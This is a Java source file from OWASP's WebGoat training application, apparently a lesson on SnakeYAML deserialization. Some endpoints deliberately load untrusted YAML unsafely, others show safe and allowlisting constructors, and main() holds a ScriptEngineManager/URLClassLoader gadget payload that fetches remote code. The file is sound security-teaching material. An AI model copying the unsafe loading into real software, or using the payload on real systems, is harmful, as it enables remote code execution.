/*
 * This file is part of WebGoat, an Open Web Application Security Project utility. For details, please see http://www.owasp.org/
 *
 * Copyright (c) 2002 - 2019 Bruce Mayhew
 *
 * This program is free software; you can redistribute it and/or modify it under the terms of the
 * GNU General Public License as published by the Free Software Foundation; either version 2 of the
 * License, or (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without
 * even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU
 * General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License along with this program; if
 * not, write to the Free Software Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA
 * 02111-1307, USA.
 *
 * Getting Source ==============
 *
 * Source for this application is maintained at https://github.com/WebGoat/WebGoat, a repository for free software projects.
 */

package org.owasp.webgoat.lessons.osssnakeyaml;

import java.io.ByteArrayInputStream;
import java.util.Collections;
import java.util.LinkedHashSet;
import java.util.List;
import java.util.Map;
import java.util.Set;
import java.util.stream.Collectors;
import org.owasp.webgoat.container.assignments.AssignmentEndpoint;
import org.owasp.webgoat.container.assignments.AssignmentHints;
import org.owasp.webgoat.container.assignments.AttackResult;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.util.Assert;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.bind.annotation.RestController;
import org.yaml.snakeyaml.LoaderOptions;
import org.yaml.snakeyaml.Yaml;
import org.yaml.snakeyaml.constructor.Constructor;
import org.yaml.snakeyaml.constructor.SafeConstructor;

@RestController
@AssignmentHints({"vulnerable-snakeyaml.hint"})
public class VulnerableSnakeYamlComponentsLesson extends AssignmentEndpoint {

  Logger log = LoggerFactory.getLogger(this.getClass().getName());

  @PostMapping("/VulnerableSnakeYamlComponents/attack1")
  public @ResponseBody AttackResult ConstructorWithload(@RequestParam String payload) {

    log.info("VulnerableSnakeYamlComponents called with payload : {}", payload);
    System.out.println(" payload ---> " + payload);

    Yaml yaml = new Yaml(new Constructor(Test1.class));

    try {
      Map<String, Object> obj = yaml.load(payload);

    } catch (IllegalArgumentException ex) {
      return success(this)
          .feedback("vulnerable-snakeyaml-components.success")
          .output(ex.getMessage())
          .build();
    } catch (Exception ex) {
      return failed(this)
          .feedback("vulnerable-snakeyaml-components.close")
          .output(ex.getMessage())
          .build();
    }

    return failed(this)
        .feedback("vulnerable-snakeyaml-components.fromXML")
        .feedbackArgs(payload)
        .build();
  }

  @PostMapping("/VulnerableSnakeYamlComponents/attack2")
  public @ResponseBody AttackResult ConstructorWithloadAs(@RequestParam String payload) {

    log.info("VulnerableSnakeYamlComponents called with payload : {}", payload);
    System.out.println(" payload ---> " + payload);

    Yaml yaml = new Yaml(new Constructor(Test1.class));

    try {
      Map<String, Object> obj = yaml.loadAs(payload, Map.class);

    } catch (IllegalArgumentException ex) {
      return success(this)
          .feedback("vulnerable-snakeyaml-components.success")
          .output(ex.getMessage())
          .build();
    } catch (Exception ex) {
      return failed(this)
          .feedback("vulnerable-snakeyaml-components.close")
          .output(ex.getMessage())
          .build();
    }

    return failed(this)
        .feedback("vulnerable-snakeyaml-components.fromXML")
        .feedbackArgs(payload)
        .build();
  }

  @PostMapping("/VulnerableSnakeYamlComponents/SafeConstructor")
  public @ResponseBody AttackResult safeConstructor(@RequestParam String payload) {

    log.info("VulnerableSnakeYamlComponents called with payload : {}", payload);
    System.out.println(" payload ---> " + payload);
    var loaderoptions = new LoaderOptions();

    Yaml yaml = new Yaml(new SafeConstructor(loaderoptions));

    try {

      Map<String, Object> obj = yaml.loadAs(payload, Map.class);

    } catch (IllegalArgumentException ex) {
      return success(this)
          .feedback("vulnerable-snakeyaml-components.success")
          .output(ex.getMessage())
          .build();
    } catch (Exception ex) {
      return failed(this)
          .feedback("vulnerable-snakeyaml-components.close")
          .output(ex.getMessage())
          .build();
    }

    return failed(this)
        .feedback("vulnerable-snakeyaml-components.fromXML")
        .feedbackArgs(payload)
        .build();
  }

  @PostMapping("/VulnerableSnakeYamlComponents/RestrictConstructor")
  public @ResponseBody AttackResult restrictConstructor(@RequestParam String payload) {

    log.info("VulnerableSnakeYamlComponents called with payload : {}", payload);
    System.out.println(" payload ---> " + payload);
    var loaderoptions = new LoaderOptions();

    Yaml yaml = new Yaml(new RestrictTypeLimitedConstructor());

    try {

      Map<String, Object> obj = yaml.loadAs(payload, Map.class);

    } catch (IllegalArgumentException ex) {
      return success(this)
          .feedback("vulnerable-snakeyaml-components.success")
          .output(ex.getMessage())
          .build();
    } catch (Exception ex) {
      return failed(this)
          .feedback("vulnerable-snakeyaml-components.close")
          .output(ex.getMessage())
          .build();
    }

    return failed(this)
        .feedback("vulnerable-snakeyaml-components.fromXML")
        .feedbackArgs(payload)
        .build();
  }

  private static class RestrictTypeLimitedConstructor extends Constructor {

    private static final Set<String> SUPPORTED_TYPES;

    static {
      Set<Class<?>> supportedTypes = new LinkedHashSet<>();
      supportedTypes.add(List.class);
      supportedTypes.add(Map.class);
      SUPPORTED_TYPES =
          supportedTypes.stream()
              .map(Class::getName)
              .collect(
                  Collectors.collectingAndThen(Collectors.toSet(), Collections::unmodifiableSet));
    }

    @Override
    protected Class<?> getClassForName(String name) throws ClassNotFoundException {
      Assert.state(
          SUPPORTED_TYPES.contains(name),
          () -> "Unsupported '" + name + "' type encountered in YAML document");
      return super.getClassForName(name);
    }
  }

  public static void main(String[] args) {

    String payload =
        "some_var: !!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL"
            + " [\"http://localhost:9000/\"]]]]";
    //		   payload = "some_var: !!javax.script.ScriptEngineManager [!!java.net.URLClassLoader
    // [[!!java.net.URL [\"http://localhost:9000\"]]]]";
    Yaml yaml = new Yaml(new Constructor(Test1.class));
    java.io.InputStream is = new ByteArrayInputStream(payload.getBytes());

    Map<String, Object> obj = yaml.load(payload);
  }
}

class Test1 {
  public String some_var = "abc";

  public String getSome_var() {
    return some_var;
  }

  public void setSome_var(String some_var) {
    this.some_var = some_var;
  }
}
